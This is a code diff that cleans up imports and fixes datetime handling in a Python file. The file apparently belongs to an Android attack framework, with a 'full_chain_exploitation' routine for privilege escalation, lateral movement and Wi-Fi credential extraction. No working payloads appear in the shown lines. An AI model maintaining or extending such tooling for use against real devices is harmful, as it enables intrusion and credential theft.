@@ -10,25 +10,19 @@ from __future__ import annotations
 
 import argparse
 import base64
-import binascii
 import hashlib
-import json
 import logging
 import os
-import platform
-import random
 import re
 import socket
 import ssl
 import struct
-import subprocess
 import sys
 import tempfile
 import threading
 import time
-import zlib
-from datetime import datetime
-from typing import Any, Dict, List, Optional, Tuple, Union
+from datetime import datetime, timedelta, timezone
+from typing import Dict, List, Optional, Tuple
 
 try:
     from cryptography import x509
@@ -40,19 +34,19 @@ except ImportError:
     CRYPTO_AVAILABLE = False
 
 try:
-    import paramiko
+    import paramiko  # noqa: F401 (availability probe)
     PARAMIKO_AVAILABLE = True
 except ImportError:
     PARAMIKO_AVAILABLE = False
 
 try:
-    import requests
+    import requests  # noqa: F401 (availability probe)
     REQUESTS_AVAILABLE = True
 except ImportError:
     REQUESTS_AVAILABLE = False
 
 try:
-    from scapy.all import IP, ICMP, UDP, DNS, DNSQR, send, sniff, Raw
+    from scapy.all import IP, ICMP, UDP, DNS, DNSQR, send, sniff, Raw  # noqa: F401 (availability probe)
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -60,18 +54,17 @@ except ImportError:
 try:
     import dns.resolver
     import dns.message
-    import dns.query
+    import dns.query  # noqa: F401 (availability probe)
     DNS_AVAILABLE = True
 except ImportError:
     DNS_AVAILABLE = False
 
 try:
-    import bluetooth
+    import bluetooth  # noqa: F401 (availability probe)
     BLUETOOTH_AVAILABLE = True
 except ImportError:
     BLUETOOTH_AVAILABLE = False
 
-from urllib.parse import urlparse
 
 logger = logging.getLogger(__name__)
 
@@ -153,9 +146,9 @@ class CryptoEngine:
         ).serial_number(
             x509.random_serial_number()
         ).not_valid_before(
-            datetime.utcnow()
+            datetime.now(timezone.utc)
         ).not_valid_after(
-            datetime.utcnow() + datetime.timedelta(days=30)
+            datetime.now(timezone.utc) + timedelta(days=30)
         ).add_extension(
             x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
             critical=False,
@@ -188,9 +181,9 @@ class CryptoEngine:
         ).serial_number(
             x509.random_serial_number()
         ).not_valid_before(
-            datetime.utcnow()
+            datetime.now(timezone.utc)
         ).not_valid_after(
-            datetime.utcnow() + datetime.timedelta(days=365)
+            datetime.now(timezone.utc) + timedelta(days=365)
         ).sign(private_key, hashes.SHA256())
         cert_pem = cert.public_bytes(serialization.Encoding.PEM)
         key_pem = private_key.private_bytes(
@@ -628,7 +621,7 @@ class QuantumAndroidFramework:
     def full_chain_exploitation(self):
         try:
             self.logger.info("STAGE 1: PRIVILEGE ESCALATION")
-            is_root = self.privesc.escalate()
+            self.privesc.escalate()
             self.logger.info("STAGE 2: LATERAL MOVEMENT RECON")
             wifi_creds = self.lateral.extract_wifi_credentials()
             if wifi_creds:
